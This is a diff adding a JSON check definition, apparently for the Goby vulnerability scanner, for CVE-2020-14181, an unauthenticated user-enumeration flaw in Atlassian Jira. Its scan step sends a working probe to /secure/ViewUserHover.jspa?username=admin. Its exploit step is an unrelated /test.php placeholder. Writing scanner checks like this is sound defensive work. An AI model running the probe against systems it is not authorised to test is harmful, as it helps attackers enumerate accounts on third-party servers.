@@ -1,0 +1,96 @@
+{
+      "Name": "Atlassian Jira user information disclosure CVE-2020-14181",
+      "Level": "1",
+      "Tags": [
+            "infoleak"
+      ],
+      "GobyQuery": "app=\"jira\" || product=\"JIRA\" || body=\"jira\"",
+      "Description": "JIRA is a defect tracking management system developed by Atlassian, Australia, for commercial applications for defect management, task tracking, and project management.The name JIRA is not an abbreviation, but a truncation of the Japanese Gojira pronunciation.",
+      "Product": "Atlassian Jira",
+      "Homepage": "https://www.atlassian.com/",
+      "Author": "",
+      "Impact": "Affected versions of Atlassian Jira Server and Data Center allow an unauthenticated user to enumerate users via an Information Disclosure vulnerability in the /ViewUserHover.jspa endpoint. The affected versions are before version 7.13.6, from version 8.0.0 before 8.5.7, and from version 8.6.0 before 8.12.0.",
+      "Recommendation": "https://www.atlassian.com/software/jira/download/",
+      "References": [
+            "https://nvd.nist.gov/vuln/detail/CVE-2020-14181"
+      ],
+      "HasExp": true,
+      "ExpParams": null,
+      "ExpTips": {
+            "Type": "",
+            "Content": ""
+      },
+      "ScanSteps": [
+            "AND",
+            {
+                  "Request": {
+                        "method": "GET",
+                        "uri": "/secure/ViewUserHover.jspa?username=admin",
+                        "follow_redirect": false,
+                        "header": null,
+                        "data_type": "text",
+                        "data": ""
+                  },
+                  "ResponseTest": {
+                        "type": "group",
+                        "operation": "AND",
+                        "checks": [
+                              {
+                                    "type": "item",
+                                    "variable": "$code",
+                                    "operation": "==",
+                                    "value": "200",
+                                    "bz": ""
+                              },
+                              {
+                                    "type": "item",
+                                    "variable": "$body",
+                                    "operation": "contains",
+                                    "value": "admin",
+                                    "bz": ""
+                              }
+                        ]
+                  },
+                  "SetVariable": []
+            }
+      ],
+      "ExploitSteps": [
+            "AND",
+            {
+                  "Request": {
+                        "method": "GET",
+                        "uri": "/test.php",
+                        "follow_redirect": true,
+                        "header": null,
+                        "data_type": "text",
+                        "data": "",
+                        "set_variable": []
+                  },
+                  "ResponseTest": {
+                        "type": "group",
+                        "operation": "AND",
+                        "checks": [
+                              {
+                                    "type": "item",
+                                    "variable": "$code",
+                                    "operation": "==",
+                                    "value": "200",
+                                    "bz": ""
+                              },
+                              {
+                                    "type": "item",
+                                    "variable": "$body",
+                                    "operation": "contains",
+                                    "value": "test",
+                                    "bz": ""
+                              }
+                        ]
+                  },
+                  "SetVariable": [
+                        "output|lastbody|regex|"
+                  ]
+            }
+      ],
+      "PostTime": "0000-00-00 00:00:00",
+      "GobyVersion": "0.0.0"
+}
